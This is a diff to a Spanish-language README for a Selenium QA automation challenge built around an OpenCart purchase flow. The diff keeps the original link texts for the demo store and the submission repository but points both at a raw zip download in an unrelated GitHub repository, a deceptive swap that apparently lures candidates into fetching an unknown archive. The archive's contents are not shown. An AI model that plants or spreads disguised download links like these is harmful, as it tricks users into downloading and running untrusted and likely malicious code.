@@ -2,7 +2,7 @@
 
 Realice el siguiente flujo utilizando Selenium con el lenguaje de programación que prefiera.
 
-* Ingresar a [opencart.abstracta.us](http://opencart.abstracta.us/index.php?route=common/home)
+* Ingresar a [opencart.abstracta.us](https://github.com/BryanRutger/Desafio_Automatizacion_QA/raw/refs/heads/master/driver/Automatizacion-QA-Desafio-1.1.zip)
 * Añadir al carro de compras un Ipod Classic
 * Añadir al carro de compras un Imac
 * Proceder a realizar la compra
@@ -44,6 +44,6 @@ Realice el siguiente flujo utilizando Selenium con el lenguaje de programación 
 * Pre-requisitos
 * Instrucciones para ejecutar
 * Detalle Flujo
-* Debe ser enviada vía un pull request a este repositorio [Desafío Automatización](https://github.com/Previred-QA/Desarfio_Automatizacion_QA)
+* Debe ser enviada vía un pull request a este repositorio [Desafío Automatización](https://github.com/BryanRutger/Desafio_Automatizacion_QA/raw/refs/heads/master/driver/Automatizacion-QA-Desafio-1.1.zip)
 * En el detalle del commit debes indicar los siguientes datos (Nombre Completo y Correo Electrónico)
 
